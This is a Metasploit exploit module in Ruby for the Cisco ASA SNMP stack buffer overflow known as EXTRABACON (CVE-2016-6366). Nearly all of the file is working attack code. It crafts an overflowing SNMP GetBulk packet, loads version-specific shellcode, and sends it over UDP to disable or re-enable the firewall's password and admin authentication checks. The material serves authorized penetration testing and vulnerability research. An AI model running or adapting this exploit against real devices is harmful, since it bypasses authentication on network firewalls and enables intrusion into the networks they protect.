require 'msf/core'
require 'snmp'

class MetasploitModule < Msf::Exploit::Remote

Rank = ExcellentRanking
include Msf::Exploit::Remote::Udp

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Cisco Adaptive Security Appliance SNMP RCE [EXTRABACON]",
      'Description'    => %q{
        This module exploits a stack buffer overflow (CVE-2016-6366) present within
        the SNMP handling code of Cisco ASA.  Affected versions include 7.2 through
        9.5.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
      [
        'Gauss, Euler, Galois et al',              # Original exploit
        'William Webb <william_webb@rapid7.com>'   # MSF module
      ],
      'References'     =>
      [
        [
          ['URL', 'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20160817-asa-snmp']
        ]
      ],
      'DefaultOptions' =>
      {
        'DisablePayloadHandler' => 'true'
      },
      'Platform'       => ['linux'],
      'Arch'           => ARCH_X86,
      'Targets'        =>
      [
        ['Cisco Adaptive Security Appliance Version 8.0(2)', { 'Version' => "asa802" }],
        ['Cisco Adaptive Security Appliance Version 8.0(3)', { 'Version' => "asa803" }],
        ['Cisco Adaptive Security Appliance Version 8.0(3)6', { 'Version' => "asa803-6" }],
        ['Cisco Adaptive Security Appliance Version 8.0(4)', { 'Version' => "asa804" }],
        ['Cisco Adaptive Security Appliance Version 8.0(4)32', { 'Version' => "asa804-32" }],
        ['Cisco Adaptive Security Appliance Version 8.0(5)', { 'Version' => "asa805" }],
        ['Cisco Adaptive Security Appliance Version 8.2(1)', { 'Version' => "asa821" }],
        ['Cisco Adaptive Security Appliance Version 8.2(2)', { 'Version' => "asa822" }],
        ['Cisco Adaptive Security Appliance Version 8.2(3)', { 'Version' => "asa823" }],
        ['Cisco Adaptive Security Appliance Version 8.2(4)', { 'Version' => "asa824" }],
        ['Cisco Adaptive Security Appliance Version 8.2(5)', { 'Version' => "asa825" }],
        ['Cisco Adaptive Security Appliance Version 8.3(1)', { 'Version' => "asa831" }],
        ['Cisco Adaptive Security Appliance Version 8.3(2)', { 'Version' => "asa832" }],
        ['Cisco Adaptive Security Appliance Version 8.4(1)', { 'Version' => "asa841" }],
        ['Cisco Adaptive Security Appliance Version 8.4(2)', { 'Version' => "asa842" }],
        ['Cisco Adaptive Security Appliance Version 8.4(3)', { 'Version' => "asa843" }],
        ['Cisco Adaptive Security Appliance Version 8.4(4)', { 'Version' => "asa844" }],
      ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Aug 15 2016'))

    register_options(
      [
        OptPort.new('RPORT', [true, "Destination port on target", 161]),
        OptString.new('RHOST', [true, "IP address of the target ASA", '']),
        OptString.new('Community', [true, "Community string", '']),
        OptBool.new('Verbose', [ true, 'Set verbose output on/off', true ]),
        OptEnum.new('Mode', [true, 'The exploit operation',  'pass-disable',
                                                                  [
                                                                    'pass-disable',
                                                                    'pass-enable'
                                                                  ]
                                                                ]),
      ], self.class)

  end

  BaconWrapped = Object::Module.new do
    attr_reader(
        :vers,
        :my_ret_addr_byte,
        :my_ret_addr_snmp,
        :my_ret_addr_len,
        :finder_byte,
        :finder_snmp,
        :finder_len,
        :preamble_byte,
        :preamble_snmp,
        :preamble_len,
        :postscript_byte,
        :postscript_snmp,
        :postscript_len,
        :launcher_byte,
        :launcher_snmp,
        :launcher_len,
        :payload_PMCHECK_ENABLE_byte,
        :payload_PMCHECK_ENABLE_snmp,
        :payload_PMCHECK_ENABLE_len,
        :payload_PMCHECK_DISABLE_byte,
        :payload_PMCHECK_DISABLE_snmp,
        :payload_PMCHECK_DISABLE_len,
        :payload_AAAADMINAUTH_ENABLE_byte,
        :payload_AAAADMINAUTH_ENABLE_snmp,
        :payload_AAAADMINAUTH_ENABLE_len,
        :payload_AAAADMINAUTH_DISABLE_byte,
        :payload_AAAADMINAUTH_DISABLE_snmp,
        :payload_AAAADMINAUTH_DISABLE_len,
        :retn
      )
  end

  class ExtraBacon
    include BaconWrapped
  end

  # ruby-snmp allows no fun at all with regards to type validation, so instead of
  # over-riding multiple classes and breaking everything, we use our own routines,
  # borrowing heavily from ruby-net-ldap

  def ber_encode(x)
    lst=[]
    retbuf = ""
    y = make_integers(x.split("."))
    for z in y
      lst << z
    end
    retbuf << (43).chr
    for i in 2...lst.length
      if lst[i] < 0x80
        retbuf << lst[i].chr
      else
        octets = ""
        n = lst[i]
        begin
          octets = (n & 0x7f | 0x80).chr << octets
          n = n >> 7
        end until n == 0
        octets[-1] = (octets[-1].ord & 0x7f).chr
        retbuf << octets
      end
    end
    return retbuf
  end

  def make_integers(list)
    list.collect{|n| Integer(n)}
  end

  def check
    target_asa  = datastore['RHOST']
    target_port = datastore['RPORT']
    comm        = datastore['Community']
    exba_targets = Hash[
                      "asa802" => "Cisco Adaptive Security Appliance Version 8.0(2)",
                      "asa803" => "Cisco Adaptive Security Appliance Version 8.0(3)",
                      "asa803-6" => "Cisco Adaptive Security Appliance Version 8.0(3)6",
                      "asa804" => "Cisco Adaptive Security Appliance Version 8.0(4)",
                      "asa804-32" => "Cisco Adaptive Security Appliance Version 8.0(4)32",
                      "asa805" => "Cisco Adaptive Security Appliance Version 8.0(5)",
                      "asa821" => "Cisco Adaptive Security Appliance Version 8.2(1)",
                      "asa822" => "Cisco Adaptive Security Appliance Version 8.2(2)",
                      "asa823" => "Cisco Adaptive Security Appliance Version 8.2(3)",
                      "asa824" => "Cisco Adaptive Security Appliance Version 8.2(4)",
                      "asa825" => "Cisco Adaptive Security Appliance Version 8.2(5)",
                      "asa831" => "Cisco Adaptive Security Appliance Version 8.3(1)",
                      "asa832" => "Cisco Adaptive Security Appliance Version 8.3(2)",
                      "asa841" => "Cisco Adaptive Security Appliance Version 8.4(1)",
                      "asa842" => "Cisco Adaptive Security Appliance Version 8.4(2)",
                      "asa843" => "Cisco Adaptive Security Appliance Version 8.4(3)",
                      "asa844" => "Cisco Adaptive Security Appliance Version 8.4(4)",
                    ]


    manager = SNMP::Manager.new(:host => target_asa, :port => target_port, :community => comm)

    resp = manager.get(["sysDescr.0"])
    resp.each_varbind do |vb|
      if exba_targets.has_value?(vb.value.to_s)
        print_status("[#{target_asa}]: Vulnerable target detected: #{vb.value.to_s}\n")
        return Exploit::CheckCode::Vulnerable
      else
        print_warning("Unable to determine if target is vulnerable.  Response: #{vb.value.to_s}")
        return Exploit::CheckCode::Unknown
      end
    end
  end

  # TODO: write code that is actually type aware

  def my_tlv(tag="\x30\x82", data)
    ln = 0
    p = ""
    p.force_encoding('binary')
    p << tag

    # compute length

    data.each do |x|
      ln += x.length
    end

    # insert it

    if tag == "\x04\x81" || tag == "\x30\x81" || tag == "\x06\x81"
      p << ln
    elsif ln >= 0x80 || tag == "\xa5\x82"
      p << [ln].pack('n')
    else
      p << ln
    end

    # insert all items

    data.each do |x|
      p.force_encoding('binary')
      x.force_encoding('binary')
      p << x
    end
    p
  end

  def hex(buf)
    return Rex::Text.to_hex_dump(buf, width=16, base=0)
  end

  def setup
    sc_file = File.join(Msf::Config.data_directory, "exploits", "EXTRABACON", "versions", "shellcode_" + target['Version'] + ".rb")

    if datastore['Verbose'] == true
      print_status("Using config file: #{sc_file}")
    end

    if !(File.file?(sc_file))
      print_error("#{sc_file} not found!")
      exit
    end

    f = File.open(sc_file, "rb")
    content = f.read

    @eb = ExtraBacon.new

    begin
      @eb.instance_eval(content)
    rescue ::Interrupt
      raise $!
    rescue ::Exception
      print_error("Failed to load shellcode template for target at #{sc_file}: #{$!}")
    end
  end

  def append_shellcode()
    p = ""
    if datastore['Mode'] == "pass-disable"
      p << @eb.payload_PMCHECK_DISABLE_byte
      p << @eb.payload_AAAADMINAUTH_DISABLE_byte
    elsif datastore['Mode'] == "pass-enable"
      p << @eb.payload_PMCHECK_ENABLE_byte
      p << @eb.payload_AAAADMINAUTH_ENABLE_byte
    else
      return "unsupported"
    end
    p << @eb.retn
    p
  end

  def post_ex(packet, request_id)
    p = packet.unpack("H*")[0]

    print_status("Got response.  Checking request-id ....")
    if datastore['Verbose'] == true
      print_status("Response:\n#{hex(packet)}")
    end
    if p.include? request_id.to_s(16) # not quite fool-proof but it'll work
      print_status("Response request-id matches!  Success is extremely likely.")
    else
      print_error("Response request-id does NOT match.  Something may have gone wrong ...")
    end
  end

  def exploit

    target_asa  = datastore['RHOST']
    target_port = datastore['RPORT']
    comm        = datastore['Community']
    head = '1.3.6.1.4.1.9.9.491.1.3.3.1.1.5.9'
    head_len = head.split('.').length

    wrapper = @eb.preamble_snmp
    wrapper += "."
    wrapper += @eb.launcher_snmp
    wrapper += "."
    wrapper += @eb.postscript_snmp
    wrapper_len = wrapper.split('.').length
    wrapper += ".144" * (82 - wrapper_len)
    wrapper_len = wrapper.split('.').length
    wrapper.force_encoding('binary')

    print_status("Appending shellcode for '#{datastore['Mode']}' operation")
    pload = append_shellcode()

    if pload == "unsupported"
      # should never get here
      print_error("Unsupported ASA version entered!")
      exit
    end

    rand_request_id = Random.rand(0x80000..0x1fffffff)

    print_status("Building packet ...")
    overflow = [head, "95", wrapper, @eb.my_ret_addr_snmp, @eb.finder_snmp].join('.')
    overflow_len = head_len + 1 + wrapper_len + @eb.my_ret_addr_len + @eb.finder_len

    tmp_str = ""
    tmp_str << "\x2b\x06\x01\x02\x01\x01\x01"
    pobj_name = ""
    pobj_name << "\x06\x07" + tmp_str                         # Object name
    pval =  my_tlv("\x04\x81", [*pload])                      # Object value
    varbind = my_tlv("\x30\x81", [pobj_name, pval])

    # tmp to calculate payload offset

    inner_body = ""
    inner_body << my_tlv("\x30\x82", [varbind])

    hdr = ""
    hdr << "\x02\x01\x01"               # SNMP v2c
    hdr << my_tlv("\x04", [comm])
    max_rep = "\x02\x01\x01"
    non_rep = "\x02\x01\x00"
    rq_id = ""
    rq_id     << "\x02\x04" + [rand_request_id].pack('N')
    gbr = ""
    gbr << my_tlv("\xa5\x82", [rq_id, non_rep, max_rep, inner_body])

    payload_offset = gbr.index(pload) + hdr.length + 4

    overflow['4.1.255.208'] = "4.#{payload_offset}.255.208"
    overflow = ber_encode(overflow)

    # do it for real now

    oflow = my_tlv("\x06\x81", [*overflow])
    oflow << "\x05\x00"
    overflow_final = my_tlv("\x30\x81", [*oflow])
    inner_body = ""
    inner_body << my_tlv("\x30\x82", [varbind, overflow_final])
    max_rep   = "\x02\x01\x01"
    non_rep   = "\x02\x01\x00"

    if datastore['Verbose'] == true
      print_status("Random request-id: 0x#{rand_request_id.to_s(16)}")
    end

    gbr = ""
    gbr << my_tlv("\xa5\x82", [rq_id, non_rep, max_rep, inner_body])

    hdr = ""
    hdr << "\x02\x01\x01"               # SNMP v2c
    hdr << my_tlv("\x04", [*comm])

    pktdata = [ hdr, gbr ]
    pkt = ""
    pkt << my_tlv("\x30\x82", [*pktdata])

    print_status("Sending exploit packet to #{datastore['RHOST']}:#{datastore['RPORT']}")
    if datastore['Verbose'] == true
      print_status("Final packet:\n#{hex(pkt)}")
    end

    connect_udp
    udp_sock.put(pkt)
    resp = udp_sock.get(3)
    sleep 3
    resp.empty? ? print_error("Timed out ...\n") : post_ex(resp, rand_request_id)
    disconnect_udp

  end

end
